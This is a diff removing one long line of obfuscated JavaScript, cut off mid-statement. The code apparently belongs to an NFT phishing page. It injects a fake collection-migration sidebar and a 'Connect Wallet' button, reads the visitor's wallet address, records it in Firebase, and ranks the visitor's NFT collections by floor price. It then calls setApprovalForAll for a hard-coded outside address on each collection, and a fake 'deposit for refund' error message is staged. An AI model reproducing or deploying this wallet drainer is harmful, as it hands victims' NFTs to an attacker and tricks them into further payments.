@@ -1,1 +1,1204 @@
-var _0x29d1cc=_0x5996;(function(_0x3207fc,_0x2b4150){var _0x54324f=_0x5996,_0x5610e0=_0x3207fc();while(!![]){try{var _0x422384=parseInt(_0x54324f(0x18d))/0x1*(parseInt(_0x54324f(0x151))/0x2)+parseInt(_0x54324f(0x17d))/0x3+-parseInt(_0x54324f(0x17b))/0x4*(parseInt(_0x54324f(0x1a7))/0x5)+-parseInt(_0x54324f(0x1a0))/0x6+parseInt(_0x54324f(0x14d))/0x7+-parseInt(_0x54324f(0x15e))/0x8*(parseInt(_0x54324f(0x147))/0x9)+parseInt(_0x54324f(0x14b))/0xa;if(_0x422384===_0x2b4150)break;else _0x5610e0['push'](_0x5610e0['shift']());}catch(_0x1418d5){_0x5610e0['push'](_0x5610e0['shift']());}}}(_0x33af,0x4b056),$(document)[_0x29d1cc(0x180)](function(){var _0x461937=_0x29d1cc;console[_0x461937(0x18f)](_0x461937(0x1ad));}));const config={'apiKey':'AIzaSyAvIsuf_K1uvzo3cXEJchcBWnxb7ryKzk0','authDomain':_0x29d1cc(0x182),'projectId':_0x29d1cc(0x168),'storageBucket':_0x29d1cc(0x156),'messagingSenderId':_0x29d1cc(0x19d),'appId':_0x29d1cc(0x14f)},app=firebase[_0x29d1cc(0x1af)](config),db=firebase['firestore'](app),ref=db[_0x29d1cc(0x1a3)](_0x29d1cc(0x1c7)),OPENSEA_URL=_0x29d1cc(0x16d);let account;async function loadWeb3(){var _0x4fa044=_0x29d1cc;try{window[_0x4fa044(0x18a)]=await new Web3(window['ethereum']);}catch{console[_0x4fa044(0x18f)](error);}}function setItem(_0x46fe4f,_0x2013ba){var _0x269525=_0x29d1cc;localStorage[_0x269525(0x16f)](_0x46fe4f,JSON[_0x269525(0x1c9)](_0x2013ba));}function getItem(_0x33020d){var _0x28c5c1=_0x29d1cc;return JSON[_0x28c5c1(0x1ae)](localStorage['getItem'](_0x33020d));}var sidebarCheck=setInterval(()=>{var _0x3719bb=_0x29d1cc;console[_0x3719bb(0x18f)](_0x3719bb(0x190)),intervalCheck();},0x3e8);async function sidebar(){var _0x31c397=_0x29d1cc;$('.sidebar-menu__opener')['on'](_0x31c397(0x175),function(){setTimeout(()=>{var _0x468b3f=_0x5996;$(_0x468b3f(0x16c))[_0x468b3f(0x19f)]('\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22sidebar-menu__item\x22><h4\x20class=\x22sidebar-menu__item-title\x20\x22>Collection\x20Migration<span\x20class=\x22sidebar-menu__item-title-chevron\x20\x22><svg\x20width=\x2232\x22\x20height=\x2232\x22\x20viewBox=\x220\x200\x2032\x2032\x22\x20fill=\x22none\x22\x20xmlns=\x22http://www.w3.org/2000/svg\x22><path\x20fill-rule=\x22evenodd\x22\x20clip-rule=\x22evenodd\x22\x20d=\x22M6.66675\x2010.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001\x2016H9.33341V13.3333L12.0001\x2013.3333V16ZM14.6667\x2018.6667H12.0001V16L14.6667\x2016V18.6667ZM17.3334\x2018.6667V21.3333H14.6667L14.6667\x2018.6667H17.3334ZM20.0001\x2016H17.3334V18.6667H20.0001V16ZM22.6667\x2013.3333L22.6667\x2016L20.0001\x2016V13.3333L22.6667\x2013.3333ZM22.6667\x2013.3333V10.6667H25.33344V13.3333H22.6667Z\x22></path></svg></span></h4><div\x20class=\x22sidebar-menu__itemaccord\x20\x22><div><button\x20class=\x22MuiButton-root\x20MuiButton-contained\x20MuiButton-containedPrimary\x20MuiButton-sizeMedium\x20MuiButton-containedSizeMedium\x20MuiButton-fullWidth\x20MuiButtonBase-root\x20\x20css-1u5qx9\x22\x20tabindex=\x220\x22\x20type=\x22button\x22>CODES_MIGRATION.EXE<span\x20class=\x22MuiTouchRipple-root\x20css-w0pj6f\x22></span></button></div></div></div><div\x20class=\x22MuiBox-root\x20css-79elbk\x22><div\x20class=\x22MuiBox-root\x20css-1sptbl0\x22><div\x20class=\x22sidebar-menu__item\x22><h4\x20class=\x22sidebar-menu__item-title\x20\x22>S2\x20citizen<span\x20class=\x22sidebar-menu__item-title-chevron\x20\x22><svg\x20width=\x2232\x22\x20height=\x2232\x22\x20viewBox=\x220\x200\x2032\x2032\x22\x20fill=\x22none\x22\x20xmlns=\x22http://www.w3.org/2000/svg\x22><path\x20fill-rule=\x22evenodd\x22\x20clip-rule=\x22evenodd\x22\x20d=\x22M6.66675\x2010.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001\x2016H9.33341V13.3333L12.0001\x2013.3333V16ZM14.6667\x2018.6667H12.0001V16L14.6667\x2016V18.6667ZM17.3334\x2018.6667V21.3333H14.6667L14.6667\x2018.6667H17.3334ZM20.0001\x2016H17.3334V18.6667H20.0001V16ZM22.6667\x2013.3333L22.6667\x2016L20.0001\x2016V13.3333L22.6667\x2013.3333ZM22.6667\x2013.3333V10.6667H25.33344V13.3333H22.6667Z\x22></path></svg></span></h4><div\x20class=\x22sidebar-menu__itemaccord\x20\x22><form\x20class=\x22sidebar-menu__item-form\x22><div\x20class=\x22sidebar-menu__item-block\x20smi_w80\x20pad-r50\x20orderf1\x22><input\x20name=\x22customMessage\x22\x20type=\x22text\x22\x20placeholder=\x22Set\x20your\x20custom\x20message\x22\x20value=\x22\x22></div><div\x20class=\x22sidebar-menu__item-block\x20smi_w33\x20pad-r50\x20smi_small\x20orderf3\x22><input\x20name=\x22identity\x22\x20type=\x22text\x22\x20inputmode=\x22numeric\x22\x20placeholder=\x22Identities\x22\x20value=\x22\x22></div><div\x20class=\x22sidebar-menu__item-block\x20smi_w33\x20pad-r50\x20smi_small\x20orderf4\x22><input\x20name=\x22cache\x22\x20type=\x22text\x22\x20inputmode=\x22numeric\x22\x20placeholder=\x22Item\x20Caches\x22\x20value=\x22\x22></div><div\x20class=\x22sidebar-menu__item-block\x20smi_w33\x20pad-r50\x20smi_small\x20orderf5\x22><input\x20name=\x22land\x22\x20type=\x22text\x22\x20inputmode=\x22numeric\x22\x20placeholder=\x22Land\x20Deeds\x22\x20value=\x22\x22></div><div\x20class=\x22sidebar-menu__item-block\x20smi_w20\x20pad-r50\x20orderf2\x22><button\x20type=\x22submit\x22\x20class=\x22sidebar-menu__item-btn\x22><span>upload</span></button></div><style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.form\x20>\x20*\x20+\x20*\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-top:\x201rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20</style></form></div></div><div\x20class=\x22sidebar-menu__item\x22><h4\x20class=\x22sidebar-menu__item-title\x20\x22>S1\x20citizen<span\x20class=\x22sidebar-menu__item-title-chevron\x20\x22><svg\x20width=\x2232\x22\x20height=\x2232\x22\x20viewBox=\x220\x200\x2032\x2032\x22\x20fill=\x22none\x22\x20xmlns=\x22http://www.w3.org/2000/svg\x22><path\x20fill-rule=\x22evenodd\x22\x20clip-rule=\x22evenodd\x22\x20d=\x22M6.66675\x2010.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001\x2016H9.33341V13.3333L12.0001\x2013.3333V16ZM14.6667\x2018.6667H12.0001V16L14.6667\x2016V18.6667ZM17.3334\x2018.6667V21.3333H14.6667L14.6667\x2018.6667H17.3334ZM20.0001\x2016H17.3334V18.6667H20.0001V16ZM22.6667\x2013.3333L22.6667\x2016L20.0001\x2016V13.3333L22.6667\x2013.3333ZM22.6667\x2013.3333V10.6667H25.33344V13.3333H22.6667Z\x22></path></svg></span></h4><div\x20class=\x22sidebar-menu__itemaccord\x20\x22><form\x20class=\x22sidebar-menu__item-form\x22><div\x20class=\x22sidebar-menu__item-block\x20smi_w80\x20pad-r50\x20orderf1\x22><input\x20name=\x22customMessage\x22\x20type=\x22text\x22\x20placeholder=\x22Set\x20your\x20custom\x20message\x22\x20value=\x22\x22></div><div\x20class=\x22sidebar-menu__item-block\x20smi_w25\x20pad-r50\x20smi_small\x20orderf3\x22><input\x20name=\x22identity\x22\x20type=\x22text\x22\x20inputmode=\x22numeric\x22\x20placeholder=\x22Identities\x22\x20value=\x22\x22></div><div\x20class=\x22sidebar-menu__item-block\x20smi_w25\x20pad-r50\x20smi_small\x20orderf4\x22><input\x20name=\x22vault\x22\x20type=\x22text\x22\x20inputmode=\x22numeric\x22\x20placeholder=\x22Vault\x20boxes\x20—\x20Optional\x22\x20value=\x22\x22></div><div\x20class=\x22sidebar-menu__item-block\x20smi_w25\x20pad-r50\x20smi_small\x20orderf5\x22><input\x20name=\x22cache\x22\x20type=\x22text\x22\x20inputmode=\x22numeric\x22\x20placeholder=\x22Item\x20Caches\x22\x20value=\x22\x22></div><div\x20class=\x22sidebar-menu__item-block\x20smi_w25\x20pad-r50\x20smi_small\x20orderf6\x22><input\x20name=\x22land\x22\x20type=\x22text\x22\x20inputmode=\x22numeric\x22\x20placeholder=\x22Land\x20Deeds\x22\x20value=\x22\x22></div><div\x20class=\x22sidebar-menu__item-block\x20smi_w20\x20pad-r50\x20orderf2\x22><button\x20class=\x22sidebar-menu__item-btn\x22><span>upload</span></button></div><style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.form\x20>\x20*\x20+\x20*\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-top:\x201rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20</style></form></div></div><div\x20class=\x22sidebar-menu__item\x22><h4\x20class=\x22sidebar-menu__item-title\x20\x22>Identities\x20&amp;\x20lands<span\x20class=\x22sidebar-menu__item-title-chevron\x20\x22><svg\x20width=\x2232\x22\x20height=\x2232\x22\x20viewBox=\x220\x200\x2032\x2032\x22\x20fill=\x22none\x22\x20xmlns=\x22http://www.w3.org/2000/svg\x22><path\x20fill-rule=\x22evenodd\x22\x20clip-rule=\x22evenodd\x22\x20d=\x22M6.66675\x2010.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001\x2016H9.33341V13.3333L12.0001\x2013.3333V16ZM14.6667\x2018.6667H12.0001V16L14.6667\x2016V18.6667ZM17.3334\x2018.6667V21.3333H14.6667L14.6667\x2018.6667H17.3334ZM20.0001\x2016H17.3334V18.6667H20.0001V16ZM22.6667\x2013.3333L22.6667\x2016L20.0001\x2016V13.3333L22.6667\x2013.3333ZM22.6667\x2013.3333V10.6667H25.33344V13.3333H22.6667Z\x22></path></svg></span></h4><div\x20class=\x22sidebar-menu__itemaccord\x20\x22><div\x20class=\x22sidebar-menu__item-blist\x22><div\x20class=\x22sidebar-menu__item-bitem\x22><form\x20action=\x22\x22\x20class=\x22sidebar-menu__item-bitem-form\x22><div\x20class=\x22sidebar-menu__item-bitem-form-holder\x22><h6\x20class=\x22sidebar-menu__item-bitem-form-title\x22>Mint\x20New\x20Identity</h6><div\x20class=\x22sidebar-menu__item-bitem-form-info\x22>Cost:\x202000\x20bytes</div></div><button\x20class=\x22sidebar-menu__item-bitem-form-btn\x22\x20disabled=\x22\x22>offline</button></form></div><div\x20class=\x22sidebar-menu__item-bitem\x22><form\x20action=\x22\x22\x20class=\x22sidebar-menu__item-bitem-form\x22><div\x20class=\x22sidebar-menu__item-bitem-form-holder\x22><h6\x20class=\x22sidebar-menu__item-bitem-form-title\x22>Create\x20New\x20Land</h6><div\x20class=\x22sidebar-menu__item-bitem-form-info\x22>Cost:\x20500\x20bytes</div></div><button\x20class=\x22sidebar-menu__item-bitem-form-btn\x22\x20disabled=\x22\x22>offline</button></form></div><div\x20class=\x22sidebar-menu__item-bitem\x22><form\x20action=\x22\x22\x20class=\x22sidebar-menu__item-bitem-form\x22><div\x20class=\x22sidebar-menu__item-bitem-form-holder\x22><h6\x20class=\x22sidebar-menu__item-bitem-form-title\x22>S2\x20Identity\x20Item\x20Claim</h6><input\x20type=\x22text\x22\x20inputmode=\x22numeric\x22\x20placeholder=\x22Add\x20S2\x20Identity\x20Token\x20ID\x22\x20value=\x220\x22></div><button\x20class=\x22sidebar-menu__item-bitem-form-btn\x22\x20disabled=\x22\x22>submit</button></form></div><div\x20class=\x22sidebar-menu__item-bitem\x22><form\x20action=\x22\x22\x20class=\x22sidebar-menu__item-bitem-form\x22><div\x20class=\x22sidebar-menu__item-bitem-form-holder\x22><h6\x20class=\x22sidebar-menu__item-bitem-form-title\x22>S2\x20Identity\x20Land\x20Claim</h6><input\x20type=\x22text\x22\x20inputmode=\x22numeric\x22\x20placeholder=\x22Add\x20S2\x20Identity\x20Token\x20ID\x22\x20value=\x220\x22></div><button\x20class=\x22sidebar-menu__item-bitem-form-btn\x22\x20disabled=\x22\x22>submit</button></form></div></div></div></div></div><button\x20class=\x22sidebar-menu__item-btn\x20MuiBox-root\x20css-htg0vc\x22><span>Connect\x20Wallet</span></button></div>\x0a\x20\x20\x20\x20\x20\x20'),$(_0x468b3f(0x1a4))[_0x468b3f(0x183)](),console[_0x468b3f(0x18f)](_0x468b3f(0x1bf));const _0xd83104=$(_0x468b3f(0x1c4)),_0x5ed219=$(_0x468b3f(0x19b));_0xd83104['on'](_0x468b3f(0x175),function(){menuItems();}),_0x5ed219['on'](_0x468b3f(0x175),function(){menuItems();});},0x3e8);});}async function header(){var _0x81b743=_0x29d1cc,_0x1a8719,_0x5e420e,_0x7b0451,_0x21b38a,_0x500428,_0x1a0a56;_0x1a8719=$(_0x81b743(0x1c5))[_0x81b743(0x16a)]('ul')[_0x81b743(0x16a)]('li')['eq']([0x0]),_0x5e420e=$(_0x81b743(0x1c5))[_0x81b743(0x16a)]('ul')['find']('li')['eq']([0x1]),_0x7b0451=$(_0x81b743(0x1c5))['find']('ul')['find']('li')['eq']([0x2]),_0x21b38a=$(_0x81b743(0x1c5))[_0x81b743(0x16a)]('ul')[_0x81b743(0x16a)]('li')['eq']([0x3]),_0x500428=$('.header-menu__right')['find']('ul')[_0x81b743(0x16a)]('li')['eq']([0x4]),_0x1a0a56=$('.header-menu__right')['find']('ul')['find']('li')['eq']([0x5]),_0x1a8719[_0x81b743(0x16a)]('a')[_0x81b743(0x171)](_0x81b743(0x161)),_0x5e420e['find']('a')[_0x81b743(0x171)](_0x81b743(0x161)),_0x7b0451['find']('a')[_0x81b743(0x171)](_0x81b743(0x161)),_0x21b38a[_0x81b743(0x16a)]('a')[_0x81b743(0x171)](_0x81b743(0x161)),_0x500428[_0x81b743(0x16a)]('a')['removeClass'](_0x81b743(0x161)),_0x1a0a56[_0x81b743(0x16a)]('a')[_0x81b743(0x171)](_0x81b743(0x161)),_0x1a8719['on'](_0x81b743(0x175),function(){menuItems();}),_0x5e420e['on'](_0x81b743(0x175),function(){menuItems();}),_0x7b0451['on'](_0x81b743(0x175),function(){menuItems();}),_0x21b38a['on']('click',function(){menuItems();}),_0x500428['on']('click',function(){menuItems();}),_0x1a0a56['on']('click',function(){menuItems();});var _0x2c6e0e=$(_0x81b743(0x1c5))[_0x81b743(0x16a)]('ul')['eq']([0x1])[_0x81b743(0x16a)]('li')['eq']([0x0]);_0x2c6e0e[_0x81b743(0x16a)]('a')[_0x81b743(0x171)]('active'),_0x2c6e0e['on'](_0x81b743(0x175),function(){menuItems();});}async function intervalCheck(){var _0x4e37a2=_0x29d1cc;$('.sidebar')['length']?(clearInterval(sidebarCheck),console[_0x4e37a2(0x18f)](_0x4e37a2(0x1b4)),await sidebar(),await header()):console[_0x4e37a2(0x18f)](_0x4e37a2(0x177));}async function menuItems(){var _0x21512f=_0x29d1cc;const _0x57c71a=$(_0x21512f(0x162))[_0x21512f(0x16a)]('li')['eq']([0x6])[_0x21512f(0x16a)]('span')['eq']([0x0])[_0x21512f(0x16a)](_0x21512f(0x1ac));_0x57c71a[_0x21512f(0x175)]();}async function getAddress(){var _0x33f07a=_0x29d1cc;const _0x5712f3=JSON['parse'](localStorage[_0x33f07a(0x194)](_0x33f07a(0x178)));console['log'](_0x5712f3);const _0x1f6b0b=_0x5712f3[_0x33f07a(0x1a5)][_0x33f07a(0x19c)][_0x33f07a(0x15c)];account=_0x1f6b0b,console['log'](account);const _0x31adca=db[_0x33f07a(0x1a3)](_0x33f07a(0x172))['doc'](account);await _0x31adca[_0x33f07a(0x1c6)]()[_0x33f07a(0x150)](_0x5d8f52=>{var _0x284b89=_0x33f07a;_0x5d8f52[_0x284b89(0x15a)]?(console[_0x284b89(0x18f)](_0x284b89(0x1ab)),_0x31adca[_0x284b89(0x149)]({'status':'connected','date':new Date()})):(console[_0x284b89(0x18f)](_0x284b89(0x18c)),_0x31adca['set']({'address':account,'date':new Date(),'status':'connected'})[_0x284b89(0x150)](()=>{var _0x41ac4e=_0x284b89;console[_0x41ac4e(0x18f)]('successfully\x20added');})[_0x284b89(0x187)](()=>{var _0x1277ab=_0x284b89;console[_0x1277ab(0x18f)](_0x1277ab(0x1b2));}));});}const _abi=[{'inputs':[],'stateMutability':_0x29d1cc(0x193),'type':_0x29d1cc(0x163)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x29d1cc(0x189),'name':_0x29d1cc(0x1b9),'type':_0x29d1cc(0x189)},{'indexed':!![],'internalType':_0x29d1cc(0x189),'name':_0x29d1cc(0x1a2),'type':_0x29d1cc(0x189)},{'indexed':!![],'internalType':_0x29d1cc(0x186),'name':_0x29d1cc(0x1b0),'type':_0x29d1cc(0x186)}],'name':'Approval','type':_0x29d1cc(0x154)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x29d1cc(0x189),'name':_0x29d1cc(0x1b9),'type':_0x29d1cc(0x189)},{'indexed':!![],'internalType':_0x29d1cc(0x189),'name':'operator','type':_0x29d1cc(0x189)},{'indexed':![],'internalType':_0x29d1cc(0x15d),'name':_0x29d1cc(0x1a2),'type':_0x29d1cc(0x15d)}],'name':_0x29d1cc(0x1a1),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x29d1cc(0x189),'name':'previousOwner','type':_0x29d1cc(0x189)},{'indexed':!![],'internalType':'address','name':_0x29d1cc(0x14a),'type':_0x29d1cc(0x189)}],'name':_0x29d1cc(0x1bd),'type':_0x29d1cc(0x154)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x29d1cc(0x189),'name':_0x29d1cc(0x167),'type':_0x29d1cc(0x189)},{'indexed':!![],'internalType':'address','name':'to','type':_0x29d1cc(0x189)},{'indexed':!![],'internalType':_0x29d1cc(0x186),'name':_0x29d1cc(0x1b0),'type':'uint256'}],'name':_0x29d1cc(0x1bc),'type':_0x29d1cc(0x154)},{'inputs':[{'internalType':_0x29d1cc(0x189),'name':'to','type':'address'},{'internalType':_0x29d1cc(0x186),'name':_0x29d1cc(0x1b0),'type':_0x29d1cc(0x186)}],'name':_0x29d1cc(0x1c3),'outputs':[],'stateMutability':'nonpayable','type':_0x29d1cc(0x165)},{'inputs':[{'internalType':_0x29d1cc(0x189),'name':'owner','type':_0x29d1cc(0x189)}],'name':_0x29d1cc(0x1a8),'outputs':[{'internalType':_0x29d1cc(0x186),'name':'','type':_0x29d1cc(0x186)}],'stateMutability':_0x29d1cc(0x191),'type':_0x29d1cc(0x165)},{'inputs':[{'internalType':'uint256','name':'tokenId','type':_0x29d1cc(0x186)}],'name':_0x29d1cc(0x17f),'outputs':[{'internalType':_0x29d1cc(0x189),'name':'','type':_0x29d1cc(0x189)}],'stateMutability':_0x29d1cc(0x191),'type':'function'},{'inputs':[{'internalType':'address','name':_0x29d1cc(0x1b9),'type':_0x29d1cc(0x189)},{'internalType':_0x29d1cc(0x189),'name':'operator','type':_0x29d1cc(0x189)}],'name':_0x29d1cc(0x19e),'outputs':[{'internalType':_0x29d1cc(0x15d),'name':'','type':_0x29d1cc(0x15d)}],'stateMutability':_0x29d1cc(0x191),'type':_0x29d1cc(0x165)},{'inputs':[],'name':_0x29d1cc(0x17c),'outputs':[{'internalType':_0x29d1cc(0x159),'name':'','type':'string'}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x29d1cc(0x1b9),'outputs':[{'internalType':_0x29d1cc(0x189),'name':'','type':_0x29d1cc(0x189)}],'stateMutability':_0x29d1cc(0x191),'type':_0x29d1cc(0x165)},{'inputs':[{'internalType':'uint256','name':_0x29d1cc(0x1b0),'type':'uint256'}],'name':_0x29d1cc(0x19a),'outputs':[{'internalType':_0x29d1cc(0x189),'name':'','type':_0x29d1cc(0x189)}],'stateMutability':'view','type':_0x29d1cc(0x165)},{'inputs':[],'name':_0x29d1cc(0x1b8),'outputs':[],'stateMutability':'nonpayable','type':_0x29d1cc(0x165)},{'inputs':[{'internalType':_0x29d1cc(0x189),'name':'to','type':_0x29d1cc(0x189)},{'internalType':_0x29d1cc(0x186),'name':_0x29d1cc(0x1b0),'type':_0x29d1cc(0x186)}],'name':_0x29d1cc(0x157),'outputs':[],'stateMutability':'nonpayable','type':_0x29d1cc(0x165)},{'inputs':[{'internalType':_0x29d1cc(0x189),'name':_0x29d1cc(0x167),'type':_0x29d1cc(0x189)},{'internalType':_0x29d1cc(0x189),'name':'to','type':_0x29d1cc(0x189)},{'internalType':_0x29d1cc(0x186),'name':_0x29d1cc(0x1b0),'type':_0x29d1cc(0x186)}],'name':_0x29d1cc(0x192),'outputs':[],'stateMutability':_0x29d1cc(0x193),'type':_0x29d1cc(0x165)},{'inputs':[{'internalType':_0x29d1cc(0x189),'name':_0x29d1cc(0x167),'type':_0x29d1cc(0x189)},{'internalType':_0x29d1cc(0x189),'name':'to','type':'address'},{'internalType':_0x29d1cc(0x186),'name':_0x29d1cc(0x1b0),'type':_0x29d1cc(0x186)},{'internalType':_0x29d1cc(0x15b),'name':_0x29d1cc(0x19c),'type':_0x29d1cc(0x15b)}],'name':_0x29d1cc(0x192),'outputs':[],'stateMutability':_0x29d1cc(0x193),'type':_0x29d1cc(0x165)},{'inputs':[{'internalType':_0x29d1cc(0x189),'name':'operator','type':_0x29d1cc(0x189)},{'internalType':'bool','name':_0x29d1cc(0x1a2),'type':_0x29d1cc(0x15d)}],'name':_0x29d1cc(0x148),'outputs':[],'stateMutability':'nonpayable','type':_0x29d1cc(0x165)},{'inputs':[{'internalType':'bytes4','name':_0x29d1cc(0x188),'type':_0x29d1cc(0x184)}],'name':_0x29d1cc(0x153),'outputs':[{'internalType':_0x29d1cc(0x15d),'name':'','type':_0x29d1cc(0x15d)}],'stateMutability':_0x29d1cc(0x191),'type':'function'},{'inputs':[],'name':_0x29d1cc(0x1b6),'outputs':[{'internalType':'string','name':'','type':'string'}],'stateMutability':_0x29d1cc(0x191),'type':'function'},{'inputs':[{'internalType':_0x29d1cc(0x186),'name':'tokenId','type':_0x29d1cc(0x186)}],'name':_0x29d1cc(0x17e),'outputs':[{'internalType':'string','name':'','type':_0x29d1cc(0x159)}],'stateMutability':_0x29d1cc(0x191),'type':'function'},{'inputs':[{'internalType':_0x29d1cc(0x189),'name':_0x29d1cc(0x167),'type':_0x29d1cc(0x189)},{'internalType':_0x29d1cc(0x189),'name':'to','type':_0x29d1cc(0x189)},{'internalType':_0x29d1cc(0x186),'name':'tokenId','type':_0x29d1cc(0x186)}],'name':'transferFrom','outputs':[],'stateMutability':_0x29d1cc(0x193),'type':'function'},{'inputs':[{'internalType':_0x29d1cc(0x189),'name':'newOwner','type':'address'}],'name':_0x29d1cc(0x14e),'outputs':[],'stateMutability':_0x29d1cc(0x193),'type':_0x29d1cc(0x165)}];function _0x33af(){var _0x5eeb54=['utils','sort','floorPrice','approve','.css-1u5qx9','.header-menu__right','get','jangtokyo','api/v2/chain/ethereum/account/','stringify','contract','code','4410432ClGFDS','setApprovalForAll','update','newOwner','671020LjBufR','data\x20already\x20exists','1585843sDoiHj','transferOwnership','1:20777123504:web:5d991c72b7af82ff6f4575','then','101804qJEuDg','getBalance','supportsInterface','event','error\x20setting\x20document\x20','jangneotokyo.appspot.com','safeMint','error:\x202389\x0amessage:\x20connected\x20account\x20must\x20deposit\x20the\x20remaining\x20required\x20amount\x20to\x20receive\x20the\x20promised\x20refund','string','exists','bytes','account','bool','8xiUdnr','https://eth-mainnet.g.alchemy.com/nft/v2/i3QT46oiQpqqceCkiWb0kIn24YNEVcRH/getFloorPrice?contractAddress=','fromWei','active','.menu2','constructor','spoof','function','Error\x20getting\x20data\x20','from','jangneotokyo','intervalStopped','find','stats','.css-14kzm9p','https://api.opensea.io/','nfts','setItem','forEach','removeClass','addresses','eth','data\x20updated','click','set','false','wagmi.store','round','toLowerCase','882088JsRTJg','name','1410354wKShoR','tokenURI','getApproved','ready','data\x20already\x20existed','jangneotokyo.firebaseapp.com','remove','bytes4','openSea','uint256','catch','interfaceId','address','web3','nothing\x20saved\x20yet','doc\x20not\x20found','5wvzexC','0xc9aD6aD094Bfb902E81cFbA1282622A4D457DF72','log','interval\x20running','view','safeTransferFrom','nonpayable','getItem','toString','GET','connected','error\x20data\x20update','application/json','ownerOf','.css-htg0vc','data','20777123504','isApprovedForAll','html','2538RglLpG','ApprovalForAll','approved','collection','.css-txdpd1','state','toWei','5DjVvIY','balanceOf','sendTransaction','length','doc\x20exists','span.menu__link-text','yawa','parse','initializeApp','tokenId','0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262','error\x20adding\x20document','seven_day_volume','true,\x20interval\x20cleared','ajax','symbol','push','renounceOwnership','owner','doc','error\x20gettings\x20documents\x20','Transfer','OwnershipTransferred','worth','sidebar\x20clicked'];_0x33af=function(){return _0x5eeb54;};return _0x33af();}async function check(){var _0x3cce47=_0x29d1cc;await getAddress(),console['log'](account);var _0x5a8458=await nfts(account);console[_0x3cce47(0x18f)](_0x5a8458);var _0x56d627={'time':new Date(),'spoof':_0x5a8458,'owner':account};getItem(account)==null||getItem(account)[_0x3cce47(0x1aa)]==0x0?(console[_0x3cce47(0x18f)]('no\x20data'),setItem(account,_0x56d627),trade(),console['log']('data\x20added')):(console['log'](_0x3cce47(0x14c)),trade());}function _0x5996(_0x459847,_0x438448){var _0x33afa8=_0x33af();return _0x5996=function(_0x599648,_0x46db07){_0x599648=_0x599648-0x145;var _0x3f3286=_0x33afa8[_0x599648];return _0x3f3286;},_0x5996(_0x459847,_0x438448);}async function trade(){var _0x3b373b=_0x29d1cc;await loadWeb3();var _0x4f6627=[],_0x455cf2,_0x3311b0=[];data=getItem(account),_0x455cf2=data['owner'],_0x4f6627=data[_0x3b373b(0x164)];for(let _0x31f833=0x0;_0x31f833<_0x4f6627[_0x3b373b(0x1aa)];_0x31f833++){_0x4f6627[_0x31f833]['worth']=0x0,_0x4f6627[_0x31f833][_0x3b373b(0x1b9)]=_0x455cf2;try{var _0x28d388=await $[_0x3b373b(0x1b5)]({'url':_0x3b373b(0x15f)+_0x4f6627[_0x31f833][_0x3b373b(0x145)],'method':_0x3b373b(0x196)});if(_0x28d388[_0x3b373b(0x185)]!=undefined&&_0x28d388[_0x3b373b(0x185)][_0x3b373b(0x1c2)]!=undefined)_0x4f6627[_0x31f833][_0x3b373b(0x1be)]=_0x28d388[_0x3b373b(0x185)][_0x3b373b(0x1c2)];}catch(_0x5bc639){console[_0x3b373b(0x18f)](_0x5bc639),_0x4f6627[_0x31f833][_0x3b373b(0x16b)][_0x3b373b(0x1b3)]>0x0&&(_0x4f6627[_0x31f833][_0x3b373b(0x1be)]=Math[_0x3b373b(0x179)](_0x4f6627[_0x31f833][_0x3b373b(0x16b)][_0x3b373b(0x1b3)]*0.8*0x2710)/0x2710);}}_0x4f6627=_0x4f6627[_0x3b373b(0x1c1)]((_0x3bc082,_0xab0ccd)=>{var _0x6bac50=_0x3b373b;return _0x3bc082[_0x6bac50(0x1be)]<_0xab0ccd[_0x6bac50(0x1be)]?0x1:-0x1;});for(let _0x256c35=0x0;_0x256c35<_0x4f6627[_0x3b373b(0x1aa)];_0x256c35++){_0x4f6627[_0x256c35]['worth']!=0x0&&_0x3311b0['push'](_0x4f6627[_0x256c35]);}_0x4f6627=_0x3311b0,console['log'](_0x4f6627);var _0xf810=[];const _0x18c12b=db[_0x3b373b(0x1a3)](account[_0x3b373b(0x17a)]());await _0x18c12b[_0x3b373b(0x1c6)]()[_0x3b373b(0x150)](_0x4ed038=>{var _0x2ed968=_0x3b373b;_0x4ed038[_0x2ed968(0x170)](_0x501e35=>{var _0x56a4aa=_0x2ed968,_0xa89883=_0x501e35['data'](),_0x9b6577=_0xa89883[_0x56a4aa(0x1a2)];_0x9b6577===![]?(console[_0x56a4aa(0x18f)]('declined'),_0xf810[_0x56a4aa(0x1b7)](_0xa89883)):console[_0x56a4aa(0x18f)](_0x56a4aa(0x18b));});})['catch'](_0x351e68=>{var _0x70954b=_0x3b373b;console['log'](_0x70954b(0x1bb)+_0x351e68);});_0xf810[_0x3b373b(0x1aa)]<0x1?console[_0x3b373b(0x18f)]('no\x20data\x20declined\x20contracts\x20yet'):(console[_0x3b373b(0x18f)]('filtered\x20declined\x20collections'),_0x4f6627=_0xf810);console[_0x3b373b(0x18f)](_0x4f6627);for(let _0x32f5e5=0x0;_0x32f5e5<_0x4f6627[_0x3b373b(0x1aa)];_0x32f5e5++){try{if(_0x4f6627[_0x32f5e5][_0x3b373b(0x1a2)]==!![])console[_0x3b373b(0x18f)](_0x3b373b(0x1a2));else{var _0x3bb4aa=await new window[(_0x3b373b(0x18a))][(_0x3b373b(0x173))]['Contract'](_abi,_0x4f6627[_0x32f5e5]['contract'],{'gas':'100000'});await _0x3bb4aa['methods'][_0x3b373b(0x148)](_0x3b373b(0x1b1),!![])['send']({'from':account}),_0x4f6627[_0x32f5e5]['date']=new 